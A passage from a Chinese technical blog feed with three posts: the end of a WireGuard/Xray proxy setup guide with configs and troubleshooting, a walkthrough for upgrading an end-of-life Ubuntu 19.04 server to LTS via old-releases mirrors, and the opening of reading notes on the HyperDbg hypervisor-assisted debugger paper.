class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;你的域名&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>构建运行，这里直接让容器使用本地网络：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t wg-xray .</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --name=wg-xray --network=host wg-xray</span><br></code></pre></td></tr></table></figure><p>成功连接，唯一的问题是延迟可能会相对比较高：</p><p><img src="https://s2.loli.net/2024/11/08/Ne5SUfJXy1DGTMi.png"></p><h1 id="0x04-可能遇到的问题"><a href="#0x04-可能遇到的问题" class="headerlink" title="0x04. 可能遇到的问题"></a>0x04. 可能遇到的问题</h1><h2 id="客户端能握手但无法连接其他终端，wg-show-显示-allowed-ips-none"><a href="#客户端能握手但无法连接其他终端，wg-show-显示-allowed-ips-none" class="headerlink" title="客户端能握手但无法连接其他终端，wg show 显示 allowed ips: (none)"></a>客户端能握手但无法连接其他终端，wg show 显示 <code>allowed ips: (none)</code></h2><p>在多设备连接到同一网络时可能出现，客户端无法连接到包括服务端在内的其他终端， <em>但是可能会有一个奇异现象是仅有一个客户端能正常连接</em> ：</p><p><img src="https://s2.loli.net/2024/10/21/4povIUfe3JaiyMb.png"></p><p>出现这种情况的原因可能是因为 <strong>IP 冲突</strong> ，大概原因是客户端之间的 IP 相互 overlap 了，从而只有其中一个能够正常工作</p><p>最简单的解决方案是 <strong>把客户端的子网掩码 设为 &#x2F;32</strong> ，下面是一个示例配置文件：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">PrivateKey</span> = 客户端私钥<br><span class="hljs-attr">Address</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.10</span>/<span class="hljs-number">32</span><br><span class="hljs-attr">MTU</span> = <span class="hljs-number">1280</span><br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 服务端公钥<br><span class="hljs-attr">Endpoint</span> = 服务端公网IP或域名:服务端配置的端口<br><span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PersistentKeepalive</span> = <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><p>对应的服务端配置：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">Address</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.1</span>/<span class="hljs-number">24</span><br><span class="hljs-attr">PostUp</span>   = iptables -A FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -A FORWARD -o wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="hljs-attr">PostDown</span> = iptables -D FORWARD -i wg0 -j ACCEPT<span class="hljs-comment">; iptables -D FORWARD -o wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="hljs-attr">ListenPort</span> = 服务端配置的端口<br><span class="hljs-attr">PrivateKey</span> = 服务端私钥<br><br><span class="hljs-section">[Peer]</span><br><span class="hljs-attr">PublicKey</span> = 客户端公钥<br><span class="hljs-attr">AllowedIPs</span> = <span class="hljs-number">10.191</span>.<span class="hljs-number">98.10</span>/<span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><h2 id="配置-WireGuard-后无法解析域名，但可以通过-IP-进行访问"><a href="#配置-WireGuard-后无法解析域名，但可以通过-IP-进行访问" class="headerlink" title="配置 WireGuard 后无法解析域名，但可以通过 IP 进行访问"></a>配置 WireGuard 后无法解析域名，但可以通过 IP 进行访问</h2><p>可能是 DNS 解析出现问题，在客户端配置文件当中你可能会习惯性额外配置如下：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Interface]</span><br><span class="hljs-attr">DNS</span> = <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span><br></code></pre></td></tr></table></figure><p>这会覆盖原有 DNS 配置，但 DNS 服务器未必是可达的（ <del>原因懂的都懂</del> ），最简单的解决方案是删除 DNS 配置或是更改成其他的可用的 DNS 服务器（例如 <code>114.114.114.114</code> ）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;龙哥就是龙！惹啊！&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="VPN" scheme="https://arttnba3.github.io/tags/VPN/"/>
    
    <category term="WireGuard" scheme="https://arttnba3.github.io/tags/WireGuard/"/>
    
  </entry>
  
  <entry>
    <title>【OPS.0x03】将 EOL 的 Ubuntu 升级为 LTS 版本</title>
    <link href="https://arttnba3.github.io/2024/09/23/OPS-0X03-OLD_UBUNTU_EOL_RELEASE_UPGRADE/"/>
    <id>https://arttnba3.github.io/2024/09/23/OPS-0X03-OLD_UBUNTU_EOL_RELEASE_UPGRADE/</id>
    <published>2024-09-23T09:09:09.000Z</published>
    <updated>2024-10-10T07:04:08.727Z</updated>
    
    <content type="html"><![CDATA[<p>欸你怎么死了（指 EOL Release）</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>最近笔者手上又多了台服务器的使用权，按照惯例每次登入一台新的服务器首先要做的第一件事自然是得先跑跑 <code>neofetch</code> 看看实力，但是发现没法安装软件包：</p><p><img src="https://s2.loli.net/2024/10/10/i8YqyG3QZ6V5tUk.png"></p><p>也没法打 <code>update &amp; upgrade</code> 的组合拳，因为这是非 LTS 的寿命只有短短 9 个月的 <code>Ubuntu 19.04 Disco</code> 版本：</p><p><img src="https://s2.loli.net/2024/10/10/dUApLxgq8XSzHrM.png"></p><p>虽然笔者不太理解为什么会有运维在服务器上安装这种短命版本，但是 <strong>新软件包都没法安的服务器自然是没法用的</strong> （ <del>难道真有人在服务器上就用一个自带的 gcc 用到死？</del> ），因此当务之急是先升级到下一个可用版本（通常是最近的一个 LTS 版本），但是当笔者运行 <code>sudo do-release-upgrade</code> 的时候服务器对笔者说 <strong>别急</strong> ：</p><p><img src="https://s2.loli.net/2024/10/10/nWCzB74GvqxFi1Y.png"></p><p>因此这篇博客简单记录一下怎么恢复短命 Ubuntu 版本的可用性并正常升级到下一个长命版本（指 <code>long-term support</code> ）</p><blockquote><p>这就是为什么大家都应该在服务器上使用企业级的 Linux 发行版 openSUSE Leap （或是 Slowroll），而不是莫名其妙安一个短命的 Ubuntu 版本：）</p></blockquote><h1 id="0x01-从-Ubuntu-19-04-升级到-LTS-版本"><a href="#0x01-从-Ubuntu-19-04-升级到-LTS-版本" class="headerlink" title="0x01. 从 Ubuntu 19.04 升级到 LTS 版本"></a>0x01. 从 Ubuntu 19.04 升级到 LTS 版本</h1><blockquote><p>注：理论上应当不仅适用于 19.04，而应当也适用于其他短命版本</p><p>注2：如果你的网络连接似乎没有那么稳定，请在 <em>分离式终端</em> （例如 tmux ）中进行这一系列操作，以避免升级到一半断连了任务中断了导致系统环境直接炸了</p></blockquote><h2 id="恢复-19-04-Disco-可用性"><a href="#恢复-19-04-Disco-可用性" class="headerlink" title="恢复 19.04 Disco 可用性"></a>恢复 19.04 Disco 可用性</h2><p>首先备份一下原来的源，虽然说这个源已经没什么用了但是还是希望能在万一失败的情况下 <em>恢复案发原现场</em> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></code></pre></td></tr></table></figure><p>然后把软件源里的老源换成 <code>old-releases.ubuntu.com</code> :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/cn.archive.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/security.ubuntu.com/old-releases.ubuntu.com/g&#x27;</span> /etc/apt/sources.list</span><br></code></pre></td></tr></table></figure><p>现在可以开始进行传统系统更新了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span><br></code></pre></td></tr></table></figure><blockquote><p>之后就可以正常安装软件了，这里笔者先安了一个 sshd，因为非常奇异搞笑的是笔者拿到的服务器上边居然没有安装 sshd，而是使用 ToDesk 进行远程连接（ <del>不知道原运维人员怎么想的，安这种生命周期只有 9 个月的版本也就算了服务器上连基础设施建设都没有</del> ），万幸的是笔者还有内网中另一台机器的控制权，因此有 sshd 的话就算万一 ToDesk 没法正常自启动笔者也能正常连接进去（<strong>事实证明 ToDesk 在重启之后确实没法直接重新连接</strong> ，虽然在 systemctl 里看这个服务似乎仍是正常运行的）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y openssh-server</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now sshd.service</span><br></code></pre></td></tr></table></figure></blockquote><p>处理软件包间依赖，然后重启系统：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get dist-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><h2 id="从-19-04-Disco-升级至-19-10-Eoan"><a href="#从-19-04-Disco-升级至-19-10-Eoan" class="headerlink" title="从 19.04 Disco 升级至 19.10 Eoan"></a>从 19.04 Disco 升级至 19.10 Eoan</h2><p>笔者本以为可以直接 <code>do-release-upgrade</code>  从 19.04 升级到 20.04 LTS 然后再继续升级：</p><p><img src="https://s2.loli.net/2024/10/10/LXoTc2enaBRtOir.png"></p><p>没有想到的是这个升级工具并不支持：</p><p><img src="https://s2.loli.net/2024/10/10/At5dqCYpEiUxsSa.png" alt="image.png"></p><p>因此我们需要先升级到下一个 <del>短命</del> 版本 <code>19.10</code> ，首先 <strong>手动</strong> 将软件源从 <code>19.04</code> 换为 <code>19.10</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sed -i -e <span class="hljs-string">&#x27;s/disco/eoan/g&#x27;</span> /etc/apt/sources.list</span><br></code></pre></td></tr></table></figure><p>然后更新系统：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get dist-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><blockquote><p>可能会有人认为万幸的是我们还有 <strong>手动进行自动升级</strong> 这一条路可以走，即首先前往 <a href="https://changelogs.ubuntu.com/meta-release">https://changelogs.ubuntu.com/meta-release</a> 找到 <code>19.04</code> 的下一个版本 <code>19.10</code> ：</p><p><img src="https://s2.loli.net/2024/10/10/X7YNw1zSgbLxPQC.png"></p><p>下载 19.10 的升级工具，解压，运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget http://old-releases.ubuntu.com/ubuntu/dists/eoan-updates/main/dist-upgrader-all/current/eoan.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> eoan</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mv</span> eoan.tar.gz eoan/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ./eoan</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -zxvf eoan.tar.gz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./eoan</span><br></code></pre></td></tr></table></figure><p>然后就 segmentation fault 了，因此这个方法至少在笔者手上的服务器上似乎是不太可行的：</p><p><img src="https://s2.loli.net/2024/10/10/XHrs49tWSpbcImP.png"></p></blockquote><h2 id="从-19-10-升级至-20-04-LTS"><a href="#从-19-10-升级至-20-04-LTS" class="headerlink" title="从 19.10 升级至 20.04 LTS"></a>从 19.10 升级至 20.04 LTS</h2><p>万事俱备，现在让我们迈向下一个发行版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo do-release-upgrade</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo reboot</span><br></code></pre></td></tr></table></figure><p>成功升级至 20.04 LTS 版本：</p><p><img src="https://s2.loli.net/2024/10/10/mP4GTkSr5y2zsKO.png"></p><blockquote><p>为什么截图上是用密码登录是因为笔者拿到服务器后第一时间想的先是升级，因此还没有配置密钥登录， <del>同时也可以看出原运维并没有把 sshd 的密码登录给关闭</del></p></blockquote><h2 id="从-20-04-升级到-24-04"><a href="#从-20-04-升级到-24-04" class="headerlink" title="从 20.04 升级到 24.04"></a>从 20.04 升级到 24.04</h2><p>如果想要继续升级到更新的系统版本，继续一路运行 <code>sudo do-release-upgrade</code> 即可：</p><p><img src="https://s2.loli.net/2024/10/10/WEax5DQP1LJt67R.png"></p><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF. REFERENCE"></a>0xFF. REFERENCE</h1><p>感谢 <code>Ask Ubuntu</code> 社区提供的核心解决方案：</p><p><a href="https://askubuntu.com/questions/1260939/cannot-upgrade-from-disco-19-04-to-focal-20-04-after-end-of-life-using-do-releas">Ask Ubuntu - Cannot upgrade from disco 19.04 to focal 20.04 after end of life using do-release-upgrade method</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;欸你怎么死了（指 EOL Release）&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x05】论文笔记：HyperDbg: Reinventing Hardware-Assisted Debugging</title>
    <link href="https://arttnba3.github.io/2024/08/31/PAPER-0X08-HYPERDBG/"/>
    <id>https://arttnba3.github.io/2024/08/31/PAPER-0X08-HYPERDBG/</id>
    <published>2024-08-30T18:59:36.000Z</published>
    <updated>2025-03-12T13:40:30.450Z</updated>
    
    <content type="html"><![CDATA[<p>猫猫帮你调试程序，猫好，人类奴役猫猫，人坏</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者最近依然在做虚拟化相关的工作（因为这个工作一直做一直摸鱼所以一直没做完喵），所以还是再简单看点相关的论文继续划划水这样子</p><p>这一次看的是一个架构比较复杂但是挺有名的开源项目——<a href="https://github.com/HyperDbg/HyperDbg">HyperDbg</a> 的论文：）</p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>现在的调试平台都由于各种限制无法提供透明、高效、高性能的 low-level 调试器，这篇论文给出了一个使用虚拟化技术辅助的调试器，其基于一个自定义的虚拟机（<del>笔者：怎么都这么喜欢自己写虚拟机</del>），并通过 EPT 进行基于硬件的指令级模拟与系统级 API 劫持，同时通过部署一个与 VMX 兼容的脚本引擎消除了不必要的上下文切换，实验结果表明 hyperdbg 的隐秘性使其比 WinDbg 和 x64dbg 能调试更多的软件样本，且调试速度比 WinDbg 快得多</p><h2 id="CCS-Concepts"><a href="#CCS-Concepts" class="headerlink" title="CCS Concepts"></a>CCS Concepts</h2><p>• Security and privacy → Software reverse engineering; Virtualization and security; Software security engineering; • Software and its engineering → Compilers.</p><h2 id="Keywords"><a href="#Keywords" class="headerlink" title="Keywords"></a>Keywords</h2><p>Hypervisor, Debugging, Kernel-debugger, Fuzzing, Malware-analysis</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>调试器（debugger）是辅助软件开发、软件逆向工程与恶意软件分析中的一个重要工具，但现代软件都有着反虚拟化、反模拟、指纹检测等技术（如调用特定的 OS APIs）来对抗调试，而现有的调试工具都缺乏相应的对抗能力，与此同时一份对 4百万恶意软件的调查显示其中 88% 都装备了反逆向技术、81%装备了反调试或反虚拟化技术，OS APIs 或是 ring-0 的选项使得高权限的恶意软件可以检测到调试器的存在</p><blockquote><p>笔者注：例如最常见的一个检测方式就是指令执行时间，例如 <code>cpuid</code> 指令在模拟执行下的总时长在虚拟机中会比物理机上高不少</p></blockquote><p>因此研究人员将目光放到硬件上，裸金属、hypervisor-level、系统管理模式（System Management Mode）甚至是 Intel 内存管理引擎（Memory Management Engine）都被用来增加调试器的透明度，但也造成了较高的性能损耗，此前提出的子内核调试器虽强但也未能提供丰富的调试功能，且大都停止更新或仅为学术目的而开发，此外社区也要求这类工具提供源码</p><p>本文给出 <a href="https://github.com/HyperDbg/HyperDbg">HYPERDBG</a> ：基于 VMM &amp;  Intel VT-x  的 debugger，其避免使用任何 OS API 或软件调试机制，而是广泛使用处理器功能（如 EPT）来监视程序执行，从而提高了执行透明性，并使得 HyperDbg 可以使用 SOTA 技术（如 hidden hook，与 inline hook 一样快），以及支持硬件调试断点以在对特定位置的读写下断；作者在 13 个打包器与保护器上进行了测试，没有一个检测到了 HYPERDBG，超越现有的其他调试器；作者在 10853 个恶意软件上展示了透明调试的适用性，成功分析的恶意样本数量分别超过 WinDbg 22%、 x64dbg 26%；作者还描述了使用 HYPERDBG 对一个 Windows kernel 0 day 的重新发现</p><p>对于高性能调试，HYPERDBG 使用与 VMX-root 兼容的脚本引擎来在内核模式执行整个复杂的调试功能，其脚本消除了用户到内核的交互且提供了巨大的调试性能，作者在单步执行、条件中断、系统调用记录中评估了 HYPERDBG，与 WinDbg 相比分别快了 2.98、1319、2018 倍</p><p>作者展示了 HYPERDBG 的设计很 🐮🍺，简而言之本文贡献如下：</p><ul><li>作者展示了 HYPERDBG，一个为深度软件分析、逆向工程、隐秘 fuzzing 而特化的 hypervisor 辅助的调试器</li><li>作者引入了 VMX-root 兼容的脚本引擎，比 SOTA 调试器快几个数量级</li><li>作者在 10853 恶意软件中证明了 HYPERDBG 的透明调试，比 SOTA 调试器能多分析 22%~26% 的样本</li><li>作者描述了 HYPERDBG 的多种应用，如大规模与快速恶意软件分析（包括 Windows 0-day 分析）、fuzzing 中的代码覆盖率、IO 设备调试、软件性能测量</li></ul><p>作者的代码开源于 <a href="https://github.com/HyperDbg/HyperDbg">https://github.com/HyperDbg/HyperDbg</a></p><h1 id="0x02-TECHNICAL-BACKGROUND"><a href="#0x02-TECHNICAL-BACKGROUND" class="headerlink" title="0x02. TECHNICAL BACKGROUND"></a>0x02. TECHNICAL BACKGROUND</h1><p>本节介绍所需的技术背景知识</p><h2 id="2-1-Modern-Debuggers"><a href="#2-1-Modern-Debuggers" class="headerlink" title="2.1 Modern Debuggers"></a>2.1 Modern Debuggers</h2><p>调试（debugging）用于检查与分析软件程序过程，逐步执行、内存观测与修改、断点等都是调试器的重要特性，调试器可被分为用户模式（如 x64dbg、Ollydbg）与内核模式（如 WinDbg、GDB）两类，随着恶意软件技术进步，研究人员开始对能提供更透明环境的虚拟化、硬件辅助方法感兴趣</p><h2 id="2-2-Instruction-Set-Architecture-ISA-Extensions"><a href="#2-2-Instruction-Set-Architecture-ISA-Extensions" class="headerlink" title="2.2 Instruction Set Architecture (ISA) Extensions"></a>2.2 Instruction Set Architecture (ISA) Extensions</h2><p>本节主要介绍 Intel 相关扩展，HYPERDBG 暂时也只支持 Intel 处理器</p><ul><li>Intel Virtualization Technology（VT-x）：Intel 的硬件辅助虚拟化技术，旨在简化虚拟化过程并提高 VMM 性能，其允许一个核心被当作多个核心运行</li><li>Intel Extended Page Table （EPT）：Intel VT-x 中的硬件辅助的 MMU，其通过 EPT 提供了 GPA 到 HPA 的转换以消除软件管理的影子页表的开销，每个 Intel 核心都有一个 EPT 表，以允许多个不同独立系统并行访问</li><li>Intel Transactional Synchronization Extensions（TSX）：TSX 为 x86 的一组指令集扩展，包括 Restricted Transactional Memory，这允许对硬件事务性的支持（如事务操作失败则回滚），本文中的 Intel TSX 特指 RTM</li></ul><h2 id="2-3-Terminology"><a href="#2-3-Terminology" class="headerlink" title="2.3 Terminology"></a>2.3 Terminology</h2><p>作者的实现基于 Intel 处理器，目标 OS 为 Microsoft Windows</p><ul><li>Hypervisor：通过虚拟共享资源实现虚拟化的软件，通过抽象硬件资源以运行虚拟机</li><li>Interrupt Request Level （IRQL）：Windows 独立于硬件的中断与代码优先级排序机制，高 IRQL 的进程会抢占低 IRQL 的线程或中断，不同的 IRQL 用于不同目的</li></ul><h1 id="0x03-HIGH-LEVEL-OVERVIEW"><a href="#0x03-HIGH-LEVEL-OVERVIEW" class="headerlink" title="0x03. HIGH-LEVEL OVERVIEW"></a>0x03. HIGH-LEVEL OVERVIEW</h1><p>本节简单介绍 HYPERDBG 的设计</p><h2 id="3-1-High-level-Debugging-Flow"><a href="#3-1-High-level-Debugging-Flow" class="headerlink" title="3.1 High-level Debugging Flow"></a>3.1 High-level Debugging Flow</h2><p> HYPERDBG 的子系统与执行流如图 1 所示，Host 与 Guest 之间通过如串口等进行通信，Host 侧提供 CLI 与用户交互，部署了汇编器&#x2F;反汇编器，并部署了多个使用了硬件特性如 EPT 的调试子系统；如图 1 所示：</p><ul><li>调试命令在 1️⃣ 中被汇编&#x2F;反汇编并传递给 Guest</li><li>脚本引擎后端在 Guest 的 hypervisor-level 解释执行，通过如 4️⃣ 所示定位用户或内核被调试者的执行流</li><li>2️⃣ 中各子系统基于事件触发执行命令与功能序列（如 3.2 所示）</li><li>子系统利用硬件特性（如 EPT）执行 3️⃣ 中操作</li></ul><p>Host 与 Guest 间需双向通信，但 HYPERDBG 可在必要时将通信限制在 guest 内核模式中的自动化例程</p><p><img src="https://s2.loli.net/2024/09/23/8wMJgiURmfse2l3.png"></p><h2 id="3-2-Event-Triggered-Interface"><a href="#3-2-Event-Triggered-Interface" class="headerlink" title="3.2 Event-Triggered Interface"></a>3.2 Event-Triggered Interface</h2><p>方便起见，作者使用“事件”（Event）这一抽象概念控制底层函数与构建块的使用，随后定义用于调试的子系统中的“条件”（Conditions）与“操作”（Actions）</p><h3 id="3-2-1-Event"><a href="#3-2-1-Event" class="headerlink" title="3.2.1 Event"></a>3.2.1 Event</h3><p>调试器所感兴趣的事件，包括设定要监视的系统调用、内存访问等，HYPERDBG 可在事件上执行任意已定义操作</p><h3 id="3-2-2-Actions"><a href="#3-2-2-Actions" class="headerlink" title="3.2.2 Actions"></a>3.2.2 Actions</h3><p>事件被触发后 HYPERDBG 可以执行称为“操作”的三类功能：下断（暂停执行）、脚本（观测与修改寄存器&#x2F;内存、创建日志等）、自定义代码（任意客制化汇编代码）</p><h3 id="3-2-3-Conditions"><a href="#3-2-3-Conditions" class="headerlink" title="3.2.3 Conditions"></a>3.2.3 Conditions</h3><p>用户定义的对事件的约束，从而只在条件满足时触发事件</p><h2 id="3-3-Operating-Modes"><a href="#3-3-Operating-Modes" class="headerlink" title="3.3 Operating Modes"></a>3.3 Operating Modes</h2><p>HYPERDBG 有两种操作模式</p><h3 id="3-3-1-VMI-Mode"><a href="#3-3-1-VMI-Mode" class="headerlink" title="3.3.1 VMI Mode"></a>3.3.1 VMI 